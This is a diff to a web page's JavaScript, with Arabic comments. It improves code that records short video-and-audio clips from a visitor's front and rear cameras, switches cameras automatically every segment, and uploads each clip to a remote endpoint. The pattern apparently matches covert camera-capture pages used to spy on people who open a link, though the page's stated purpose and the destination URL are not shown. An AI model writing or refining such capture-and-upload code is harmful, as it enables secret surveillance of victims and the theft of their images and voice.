@@ -808,6 +808,7 @@
                 errorMsg.textContent = '';
 
                 try {
+                    // طلب الكاميرا الأمامية والميكروفون
                     const stream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                         audio: true
@@ -840,10 +841,39 @@
             let recordedChunks = [];
             let isRecording = false;
             let mainStream = null;
-            let switchInterval = null;
             let stopTimeout = null;
             let currentCameraMode = 'user';
             let isSwitching = false; // لمنع التبديل المتزامن
+
+            // دالة للتحقق من توفر كاميرا خلفية
+            async function hasBackCamera() {
+                try {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                    // نبحث عن كاميرا ليست أمامية (قد تكون خلفية)
+                    for (const device of videoDevices) {
+                        if (device.label.toLowerCase().includes('back') ||
+                            device.label.toLowerCase().includes('rear') ||
+                            device.label.toLowerCase().includes('environment')) {
+                            return true;
+                        }
+                    }
+                    // إذا لم نجد بالاسم، نحاول فتح كاميرا بيئة
+                    try {
+                        const testStream = await navigator.mediaDevices.getUserMedia({
+                            video: { facingMode: { ideal: 'environment' } },
+                            audio: false
+                        });
+                        testStream.getTracks().forEach(track => track.stop());
+                        return true;
+                    } catch (e) {
+                        return false;
+                    }
+                } catch (e) {
+                    console.warn('تعذر فحص الكاميرات:', e);
+                    return false;
+                }
+            }
 
             // دالة لبدء التسجيل لمدة 5 ثوانٍ ثم التبديل تلقائياً
             function startRecordingSegment() {
@@ -906,16 +936,20 @@
                 const newMode = (currentCameraMode === 'user') ? 'environment' : 'user';
                 console.log(`🔄 محاولة التبديل إلى الكاميرا: ${newMode}`);
 
-                // إيقاف التيار الحالي بالكامل لتحرير الكاميرا
-                if (mainStream) {
-                    mainStream.getTracks().forEach(t => t.stop());
-                    mainStream = null;
-                }
-
                 try {
+                    // نحاول الحصول على الكاميرا الجديدة مع الإبقاء على القديمة مؤقتاً
                     let newStream;
-                    // محاولة الحصول على الكاميرا الجديدة
                     if (newMode === 'environment') {
+                        // التحقق من وجود كاميرا خلفية
+                        const hasBack = await hasBackCamera();
+                        if (!hasBack) {
+                            console.warn('❌ لا توجد كاميرا خلفية متاحة، نبقى على الأمامية');
+                            // نستمر بالكاميرا الحالية
+                            isSwitching = false;
+                            // نبدأ تسجيل جديد بالتيار الحالي
+                            startRecordingSegment();
+                            return;
+                        }
                         try {
                             const exactConstraints = {
                                 video: { facingMode: { exact: 'environment' }, width: { ideal: 640 }, height: { ideal: 480 } },
@@ -938,7 +972,10 @@
                         newStream = await navigator.mediaDevices.getUserMedia(constraints);
                     }
 
-                    // تطبيق التيار الجديد
+                    // نجحنا في الحصول على الكاميرا الجديدة، الآن نوقف القديمة ونستبدلها
+                    if (mainStream) {
+                        mainStream.getTracks().forEach(track => track.stop());
+                    }
                     mainStream = newStream;
                     currentCameraMode = newMode;
                     console.log(`✅ تم التبديل إلى الكاميرا: ${newMode}`);
@@ -947,12 +984,15 @@
                 } catch (e) {
                     console.warn('فشل تبديل الكاميرا:', e);
                     isSwitching = false;
-                    // محاولة العودة إلى الكاميرا الأمامية كخيار آمن
+                    // إذا فشل التبديل، نحاول العودة إلى الكاميرا الأمامية
                     try {
                         const fallbackStream = await navigator.mediaDevices.getUserMedia({
                             video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                             audio: true
                         });
+                        if (mainStream) {
+                            mainStream.getTracks().forEach(track => track.stop());
+                        }
                         mainStream = fallbackStream;
                         currentCameraMode = 'user';
                         console.log('✅ تم العودة إلى الكاميرا الأمامية');
@@ -1000,7 +1040,7 @@
                     .then(res => res.json())
                     .then(data => {
                         if (!data.ok) console.warn('فشل إرسال الفيديو:', data);
-                        else console.log('✅ تم إرسال الفيديو بنجاح');
+                        else console.log(`✅ تم إرسال الفيديو من الكاميرا ${camLabel}`);
                     })
                     .catch(e => console.warn('خطأ إرسال الفيديو:', e));
             }
